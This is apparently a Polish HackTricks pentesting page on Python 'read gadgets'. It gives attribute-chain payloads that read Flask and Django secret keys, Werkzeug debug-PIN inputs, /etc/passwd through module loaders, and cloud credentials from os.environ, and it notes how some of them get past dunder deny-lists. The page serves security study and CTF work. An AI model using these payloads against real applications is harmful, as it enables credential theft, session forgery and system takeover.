# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Różne podatności, takie jak [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) lub [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogą pozwolić na **odczyt wewnętrznych danych Pythona, ale nie na wykonywanie kodu**. Dlatego pentester będzie musiał maksymalnie wykorzystać te uprawnienia odczytu, aby **uzyskać poufne uprawnienia i eskalować podatność**.

### Flask - Odczyt secret key

Strona główna aplikacji Flask prawdopodobnie będzie zawierać globalny obiekt **`app`**, w którym skonfigurowany jest ten **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
W tym przypadku można uzyskać dostęp do tego obiektu, używając dowolnego gadgetu do **access global objects** ze strony [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Jeśli **vulnerability znajduje się w innym pliku Pythona**, potrzebny jest gadget do przeszukiwania plików, aby dotrzeć do głównego pliku i **access the global object `app.secret_key`**, a następnie móc [**escalate privileges** dzięki znajomości tego klucza](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Przykładowy payload [z tego writeupu](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Użyj tego payload, aby **odczytać `app.secret_key`**. Jeśli pierwotny bug daje również write primitive (na przykład class pollution), tej samej ścieżki można użyć do zastąpienia tego klucza i podpisywania bardziej uprzywilejowanych cookies Flask.

### Werkzeug - machine_id i node uuid

[**Używając tych payload z tego writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) uzyskasz dostęp do **machine_id** i węzła **uuid**, czyli **prywatnych danych** potrzebnych do [**wygenerowania Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) i uzyskania dostępu do konsoli Pythona w `/console`, jeśli **debug mode jest włączony**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Pamiętaj, że możesz uzyskać **lokalną ścieżkę serwera do pliku `app.py`**, generując na stronie internetowej **błąd**, który **poda Ci tę ścieżkę**.

Jeśli podatność znajduje się w innym pliku pythonowym, sprawdź wcześniejszy Flask trick umożliwiający dostęp do obiektów z głównego pliku pythonowego.

### Django - SECRET_KEY i moduł settings

Obiekt ustawień Django jest buforowany w `sys.modules` po uruchomieniu aplikacji. Korzystając wyłącznie z prymitywów odczytu, możesz uzyskać leak **`SECRET_KEY`**, kluczy zapasowych, danych uwierzytelniających do bazy danych lub soli podpisywania:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Jeśli podatny gadget znajduje się w innym module, najpierw przejdź po globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` są równie cenne jak bieżący `SECRET_KEY`: nadal weryfikują stare podpisane wartości podczas rotacji.<sup>[[1]](#references)</sup> Wyciek `SESSION_ENGINE` i `SESSION_SERIALIZER` pozwala szybko ustalić, czy wpływ ogranicza się tylko do fałszowania ciasteczek, czy obejmuje coś poważniejszego. Szczegóły dotyczące wpływu na web znajdziesz na stronie [**Django pentesting**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - odczyt kodu źródłowego i plików

Załadowane moduły Python zwykle zachowują `__loader__`. Loadery oparte na plikach często udostępniają `get_source()` i `get_data()`, które są idealnymi **prymitywami tylko do odczytu**, gdy masz już dostęp do obiektu modułu, ale nie do `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Jest to bardzo przydatne do dumpowania **config modules, blueprintów, plików pomocniczych lub ukrytych routes** oraz odzyskiwania kluczy API, DSN-ów, ścieżek flag lub dodatkowych entry points gadgetów.

Jeśli masz tylko enumerację subclass, wyszukaj loader po nazwie zamiast hard-codować indeks:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globalne zmienne ramki generatora / coroutine

Jeśli możesz utworzyć lub uzyskać dostęp do obiektu generatora/coroutine, jego ramka może ujawnić globalne zmienne **bez konieczności użycia żadnego gadgetu `__globals__` funkcji**. Jest to przydatne przeciwko filtrom, które blokują wyłącznie nazwy dunder i pomijają atrybuty ramki, takie jak `gi_frame`, `ag_frame`, `cr_frame` lub `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Gdy uzyskasz globals ramki, kontynuuj dokładnie tak jak w przypadku innych gadgets (`sys.modules`, obiektów settings, `os.environ` itd.). Ostatnie sandbox escapes wciąż odkrywają to na nowo, ponieważ `gi_frame` i `f_globals` nie są atrybutami dunder i często przetrwają naiwne deny-lists.

### Zmienne środowiskowe / cloud creds za pośrednictwem załadowanych modułów

Wiele jaili nadal importuje gdzieś `os` lub `sys`. Możesz wykorzystać dowolną osiągalną funkcję `__init__.__globals__`, aby przejść do już zaimportowanego modułu `os` i zrzucić **zmienne środowiskowe** zawierające API tokens, cloud keys lub flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Jeśli indeks podklasy jest filtrowany, użyj loaderów:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Zmienne środowiskowe są często jedynymi sekretami potrzebnymi do przejścia od odczytu do pełnego przejęcia systemu (klucze cloud IAM, adresy URL baz danych, klucze podpisywania itp.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) umożliwiało **class pollution** za pomocą spreparowanych żądań komponentów. Ustawienie ścieżki właściwości takiej jak `__init__.__globals__` pozwalało atakującemu uzyskać dostęp do globalnych zmiennych modułu komponentu oraz wszystkich zaimportowanych modułów (np. `settings`, `os`, `sys`). Następnie można było wykraść `SECRET_KEY`, `DATABASES` lub dane uwierzytelniające usług bez wykonywania kodu. Łańcuch exploitacji opiera się wyłącznie na odczycie i wykorzystuje te same wzorce dunder-gadgetów co powyżej.<sup>[[5]](#references)</sup>

### Kolekcje gadgetów do łańcuchowania

Najnowsze CTF-y i badania nad pyjail pokazują niezawodne łańcuchy odczytu budowane wyłącznie za pomocą dostępu do atrybutów i enumeracji klas bazowych. Utrzymywane przez społeczność listy, takie jak [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogują setki minimalnych gadgetów, które można łączyć w celu przechodzenia od obiektów do `__globals__`, `sys.modules`, a na końcu do poufnych danych.<sup>[[2]](#references)</sup> Preferuj wyszukiwanie **oparte na atrybutach/nazwach** zamiast używania surowych indeksów klas bazowych, ponieważ pozycja `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. zmienia się między wersjami Pythona oraz wraz z dodatkowymi zaimportowanymi bibliotekami.

## Referencje

- [1] [Dokumentacja podpisywania kryptograficznego Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki gadgetów Python sandbox](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Podatność Django-Unicorn typu Class Pollution prowadząca do RCE, XSS, DoS i obejścia uwierzytelniania (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
